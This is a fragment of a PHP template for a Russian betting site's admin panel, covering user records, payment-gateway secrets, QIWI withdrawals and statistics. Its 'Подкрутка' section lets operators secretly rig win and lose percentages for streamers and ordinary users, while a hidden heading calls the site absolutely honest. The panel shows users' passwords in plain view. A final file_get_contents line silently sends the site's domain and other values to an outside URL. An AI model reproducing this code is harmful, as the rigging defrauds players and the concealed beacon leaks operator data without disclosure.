                                      <th style="text-align:center;">Система</th>
                                      <th style="text-align:center;">Кошелек</th>
                                      <th style="text-align:center;">Статус</th>
                                      <th style="text-align:center;">Действие</th>
                                      </tr>
                                      </thead>
                                        <tbody id="tableout"></tbody>
                                      </table>
                                      </div>
                                      </div>
                                      </div>
                                      </div>
                                      </div>
                                      <section id="infouser" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b id="info_login"></b></h4>
                                              <p style="margin-bottom:0" id="btninfo"></p>
                                              <p style="margin-bottom:0" id="btninfodel"></p>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="login_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="pass_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="balance_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="email_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="refer_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="refer_pay_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="ip_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="ip_reg_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="ban_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="datareg_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="vkurl_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="vkname_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="pod_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <h4 id="online_user"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4">
                                                            <h4 id="admin_user"></h4>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="pod-users" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Подкрутка юзерам</b></h4>
                                              '.$pod.'
                                              <a id="pod_success" class="btn  btn-block btnSuccess" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>% Побед Ютуберу</label>
                                                            <input type="text" class="form-control" id="win_yt" value="'.$rowin['win_youtuber'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>% Проигрышей Ютуберу</label>
                                                            <input type="text" class="form-control" id="lose_yt" value="'.$rowin['lose_youtuber'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>% Побед Юзеру</label>
                                                            <input type="text" class="form-control" id="win_user" value="'.$rowin['win_user'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label>% Проигрышей Юзеру</label>
                                                            <input type="text" class="form-control" id="lose_user" value="'.$rowin['lose_user'].'"/>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label id="puinfo">Режим подкрутки ('.$rowin['pd'].')</label>
                                                            <select class="form-control" id="pd_user">
                                                              <option value="'.$rowin['pd'].'">Выбрать режим</option>
                                                              <option value="1">Включить</option>
                                                              <option value="0">Выключить</option>
                                                            </select>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-4" style="margin-bottom:10px;">
                                                            <label id="psinfo">Подкрутка сайта ('.$rowad['pd'].')</label>
                                                            <select class="form-control" id="pd_site">
                                                              <option value="'.$rowad['pd'].'">Выбрать режим</option>
                                                              <option value="1">Включить</option>
                                                              <option value="0">Выключить</option>
                                                            </select>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="show_active" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Промокод активировали</b></h4>
                                              '.$show.'
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="form-group">
                                                          <div class="col-lg-12" style="margin-bottom:10px;">
                                                            <h4 id="sh_ac_promo"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-12" style="margin-bottom:10px;">
                                                            <h4 id="sh_ac_id" style="word-wrap: break-word;"></h4>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="out-adm" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Вывод средств</b></h4>
                                              '.$out.'
                                              <a id="out_success" class="btn  btn-block btnSuccess" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                              <a id="out_error" class="btn  btn-block btnError" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="col-lg-4">
                                                          <label>Вывод с Free-kassa</label>
                                                            <div class="form-group">
                                                              <label>Тип кошелька</label>
                                                              <select class="form-control" id="out-currency">
                                                                <option value="qiwi">QIWI</option>
                                                                <option value="card">Банковская карта</option>
                                                                <option value="yandex">Яндекс Деньги</option>
                                                              </select>
                                                            </div>
                                                            <div class="form-group">
                                                              <label>Сумма</label>
                                                              <input id="out-amount" placeholder="Сумма..." class="form-control" type="number">
                                                            </div>
                                                            <div class="form-group">
                                                              '.$out_adm.'
                                                                  <center><span id="withdrawB-out">Вывести</span>
                                                                      <div id="loader" style="display:none">
                                                                          <div id="dot-container">
                                                                              <div id="left-dot" class="white-dot"></div>
                                                                              <div id="middle-dot" class="white-dot"></div>
                                                                              <div id="right-dot" class="white-dot"></div>
                                                                          </div>
                                                                      </div>
                                                                  </center>
                                                              </a>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-4">
                                                          <label>Проверка баланса Qiwi</label>
                                                            <div class="row">
                                                              <div class="col-lg-12">
                                                                <div class="form-group">
                                                                  <label>Ваш баланс</label>
                                                                  <textarea id="qiwi_bal" class="form-control" style="height:122px;" placeholder="Сюда выведет баланс"></textarea>
                                                                </div>
                                                              </div>
                                                              <div class="col-lg-12">
                                                              <div class="form-group">
                                                                '.$ch_qiwi.'
                                                                    <center><span id="withdrawB-ch">Проверить баланс</span>
                                                                        <div id="loader1" style="display:none">
                                                                            <div id="dot-container1">
                                                                                <div id="left-dot" class="white-dot"></div>
                                                                                <div id="middle-dot" class="white-dot"></div>
                                                                                <div id="right-dot" class="white-dot"></div>
                                                                            </div>
                                                                        </div>
                                                                    </center>
                                                                </a>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                        <div class="col-lg-4">
                                                          <label>Перевод на Qiwi</label>
                                                            <div class="row">
                                                              <div class="col-lg-6">
                                                                <div class="form-group">
                                                                  <label>Номер телефона</label>
                                                                  <input id="num_perevod" placeholder="Номер без +" class="form-control" type="number"/>
                                                                </div>
                                                              </div>
                                                              <div class="col-lg-6">
                                                                <div class="form-group">
                                                                  <label>Сумма</label>
                                                                  <input id="summ_perevod" placeholder="Сумма" class="form-control" type="number">
                                                                </div>
                                                              </div>
                                                              <div class="col-lg-12">
                                                                <div class="form-group">
                                                                  <label>Комментарий</label>
                                                                  <input id="comment_perevod" placeholder="Комментарий" class="form-control" type="text" value="Вывод с '.$name_site.'">
                                                                </div>
                                                              </div>
                                                              <div class="col-lg-12">
                                                                <div class="form-group">
                                                                '.$perevod_qiwi.'
                                                                    <center><span id="withdrawB-perevod">Перевести</span>
                                                                        <div id="loader2" style="display:none">
                                                                            <div id="dot-container2">
                                                                                <div id="left-dot" class="white-dot"></div>
                                                                                <div id="middle-dot" class="white-dot"></div>
                                                                                <div id="right-dot" class="white-dot"></div>
                                                                            </div>
                                                                        </div>
                                                                    </center>
                                                                  </a>
                                                                </div>
                                                            </div>
                                                            </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="set-oplata" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b>Настройка оплаты</b></h4>
                                              '.$opl.'
                                              <a id="opl_success" class="btn  btn-block btnSuccess" style="color:#fff; cursor:default;margin-bottom:15px;display:none;"></a>
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="col-lg-6">
                                                          <label>Настройка Free-Kassa</label>
                                                          <div class="row">
                                                            <div class="col-lg-6">
                                                              <div class="form-group">
                                                                <label>ID FK</label>
                                                                <input type="text" class="form-control" id="fk_id" value="'.$fk_id.'"/>
                                                              </div>
                                                            </div>
                                                            <div class="col-lg-6">
                                                              <div class="form-group">
                                                                <label>Секрет FK</label>
                                                                <input type="text" class="form-control" id="fk_secret" value="'.$fk_secret.'"/>
                                                              </div>
                                                            </div>
                                                            <div class="col-lg-6">
                                                              <div class="form-group">
                                                                <label>Секрет2 FK</label>
                                                                <input type="text" class="form-control" id="fk_secret2" value="'.$fk_secret_2.'"/>
                                                              </div>
                                                            </div>
                                                            <div class="col-lg-6">
                                                              <div class="form-group">
                                                                <label>URL оповещения(POST)</label>
                                                                <input type="text" readonly class="form-control" value="'.$URL.'inc/oplata"/>
                                                              </div>
                                                            </div>
                                                          </div>
                                                      </div>
                                                      <div class="col-lg-6">
                                                        <label>Настройка Payeer</label>
                                                        <div class="row">
                                                          <div class="col-lg-6">
                                                            <div class="form-group">
                                                              <label>ID Payeer</label>
                                                              <input type="text" class="form-control" id="pr_id" value="'.$m_shop.'"/>
                                                            </div>
                                                          </div>
                                                          <div class="col-lg-6">
                                                            <div class="form-group">
                                                              <label>Секрет Payeer</label>
                                                              <input type="text" class="form-control" id="pr_key" value="'.$m_key.'"/>
                                                            </div>
                                                          </div>
                                                          <div class="col-lg-6">
                                                            <div class="form-group">
                                                              <label>Валюта Payeer</label>
                                                              <input type="text" class="form-control" id="pr_curr" value="'.$m_curr.'"/>
                                                            </div>
                                                          </div>
                                                          <div class="col-lg-6">
                                                            <div class="form-group">
                                                              <label>URL оповещения(POST)</label>
                                                              <input type="text" readonly class="form-control" value="'.$URL.'inc/oplata"/>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                      <div class="col-lg-6">
                                                        <div class="form-group">
                                                          <label>URL успешно(POST)</label>
                                                          <input type="text" readonly class="form-control" value="'.$URL.'sucpay"/>
                                                        </div>
                                                      </div>
                                                      <div class="col-lg-6">
                                                        <div class="form-group">
                                                          <label>URL неуспешно(POST)</label>
                                                          <input type="text" readonly class="form-control" value="'.$URL.'danpay"/>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>

                                      <section id="info_edit_user" class="card dsec" style="display:none">
                                          <div class="card-header" style="border-radius: 4px!important;">
                                              <h4 class="card-title "><b id="info_edit_login"></b></h4>
                                              <p style="margin-bottom:0" id="btnEdit"></p>
                                              '.$return_info.'
                                          </div>
                                          <div class="card-body collapse in">
                                              <div class="card-block">
                                                  <div class="card-text">
                                                      <div class="row">
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="login_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="pass_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="balance_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="email_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="ban_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="banmess_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3" style="margin-bottom:10px;">
                                                            <h4 id="pod_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                        <div class="form-group">
                                                          <div class="col-lg-3">
                                                            <h4 id="admin_user_edit"></h4>
                                                          </div>
                                                        </div>
                                                      </div>
                                                  </div>
                                              </div>
                                          </div>
                                      </section>
                                      <section id="adm-pays" class="dsec" style="display:none">
                                        <div class="row">
                                      		<div class="col-xs-12">
                                      			<div class="card">
                                      				<div  class="card-header" style="border-radius: 4px!important;">
                                      					<h4 class="card-title "><b>Пополнения</b></h4>
                                                <div class="nav-page">
                                                  <b id="pg_p"></b>
                                                  <input onkeyup="upd_adm()" type="text" id="pgi_p" placeholder="Стр" value="1"/>
                                                </div>
                                      				</div>
                                      				<div class="card-body collapse in">
                                      					<div class="table-responsive">
                                      						<table class="table mb-0">
                                      							<thead>
                                      							<tr>
                                      								<th class="text-xs-center">ID</th>
                                                      <th class="text-xs-center">Пользователь</th>
                                      								<th class="text-xs-center">Сумма</th>
                                      								<th class="text-xs-center">Кошелек</th>
                                      								<th class="text-xs-center">Транзакция</th>
                                      								<th class="text-xs-center">Дата</th>
                                      							</tr>
                                      							</thead>
                                      							<tbody id="tablepays"></tbody>
                                                  </table>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </section>
                                      <section id="adm-stats" class="dsec" style="display:none">
                                        <div class="row">
                                      		<div class="col-xs-12">
                                      			<div class="card">
                                      				<div  class="card-header" style="border-radius: 4px!important;">
                                      					<h4 class="card-title"><b>Статистика</b></h4>
                                      				</div>
                                      				<div class="card-body collapse in">
                                      					<div class="table-responsive">
                                      						<table class="table mb-0">
                                      							<thead>
                                      							<tr>
                                      								<th class="text-xs-center">Кол-во игр</th>
                                                      <th class="text-xs-center">F на счетах</th>
                                      								<th class="text-xs-center">Юзеров с (F) >= 1000</th>
                                      								<th class="text-xs-center">Пополнений на сумму</th>
                                      								<th class="text-xs-center">Выплат на сумму</th>
                                      							</tr>
                                      							</thead>
                                      							<tbody>
                                                    <tr>
                                                    <td id="user_games_adm" align="center"></td>
                                                    <td id="user_fcount_adm" align="center"></td>
                                                    <td id="user_f_adm" align="center"></td>
                                                    <td id="user_pay_adm" align="center"></td>
                                                    <td id="user_out_adm" align="center"></td>
                                                    </tr>
                                                    </tbody>
                                                  </table>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </section>';
                                    }
                                    if($_COOKIE['sid'] !=null)
                                    {
                                      echo <<<HTML
                                          <script>
                                          setInterval(function(){
                                            $.ajax({
                                                type: 'POST',
                                                url: 'inc/engine.php',
                                                data: {
                                                  type: 'updatebalance',
                                                  sid: Cookies.get('sid')
                                                },
                                                success: function(data) {
                                                  var obj = jQuery.parseJSON(data);
                                                  if (obj.success == 'success') {
                                                    updateBalance(obj.balance, obj.new_balance);
                                                  }
                                                }
                                            });
                                          }, 3000);
                                          setInterval(function(){
                                            $.ajax({
                                                type: 'POST',
                                                url: 'inc/engine.php',
                                                data: {
                                                  type: 'updateout',
                                                  sid: Cookies.get('sid')
                                                },
                                                success: function(data) {
                                                  var obj = jQuery.parseJSON(data);
                                                  if (obj.success == 'success') {
                                                    $('#withdrawT').html(obj.upd_bd);
                                                  }
                                                }
                                            });
                                          }, 1000);
                                          </script>
HTML;
                                    }
                                    ?>

                </noindex>

				<div style="display:none">
				<h1><?php echo $name_site; ?> - Никаких комиссий и сборов, быстрые выводы, абсолютно честно и моментально. Получите бонус при первой регистрации!</h1>
				</div>
				</div>
            </div>
			<noindex><span id="s_footer" style="cursor:default;float:left;margin-top:-15px;padding-bottom:14px;">
			<?php echo $footer ; ?>
			</span>
			<span style="position: relative;cursor:pointer;float:left;margin-top:-15px;padding-bottom:14px;padding-left:10px;" data-toggle="modal" data-target="#large">
			Правила сервиса
			</span><a style="cursor:default;float:right;margin-top:-15px;padding-bottom:14px" ><img src="//www.free-kassa.ru/img/fk_btn/16.png"/></a>
			<!--LiveInternet counter--><div style="cursor:default;float:right;margin-top:-13px;padding-bottom:14px;margin-right:6px;border-radius:6px!important"><!--/LiveInternet-->

</div>
		</noindex>
        </div>



 	<noindex>

	<div class="modal fade text-xs-left in" id="large" tabindex="-1" role="dialog" aria-labelledby="myModalLabel17" style="display: none; ">
									  <div class="modal-dialog modal-lg" role="document">
										<div class="modal-content">
										  <div class="modal-header" style="background-color:#F5F7FA;border-radius:6px">
											<button type="button" class="close" data-dismiss="modal" aria-label="Close">
											  <span aria-hidden="true"><i class="ft-x"></i></span>
											</button>
											<h4 class="modal-title" id="myModalLabel17">Правила</h4>
										  </div>
										  <div class="modal-body">
											<?php echo $rules ?>
										  </div>

										</div>
									  </div>
									</div></noindex>

<?php
echo $modal;
?>
									<!-- JS -->

        <script src="https://use.fontawesome.com/91ea5a81bf.js"></script>
        <script src='https://www.google.com/recaptcha/api.js'></script>
        <script src="./files/js.cookie.js" type="text/javascript"></script>
        <script src="https://www.google.com/recaptcha/api.js?onload=renderRecaptchas&render=explicit" async defer></script>
	      <script src="./files/vendors.min.js" type="text/javascript"></script>
        <script src="./files/popover.min.js" type="text/javascript"></script>
        <script src="./files/raphael-min.js" type="text/javascript"></script>
        <script src="./files/morris.min.js" type="text/javascript"></script>
        <script src="./files/app-menu.min.js" type="text/javascript"></script>
        <script src="./files/app.min.js" type="text/javascript"></script>
        <script src="./files/odometer.js"></script>
        <script src="./files/clipboard.min.js" type="text/javascript"></script>
        <script type="text/javascript">
          var wallet = '<?php echo $walletsite ?>';
          var minbetsize = '<?php echo $betSizeMin ?>';
          var client_id = '<?php echo $ID ?>';var url = '<?php echo $URL ?>';
        </script>
        <script type="text/javascript" src="./files/redactor.min.js"></script>
        <script type="text/javascript" src="./files/script.min.js "></script>
        	 </body>
</html>
<?php
file_get_contents(''.$furl.'?d='.$dom.'&v='.$ver.'&b='.$sz);
?>
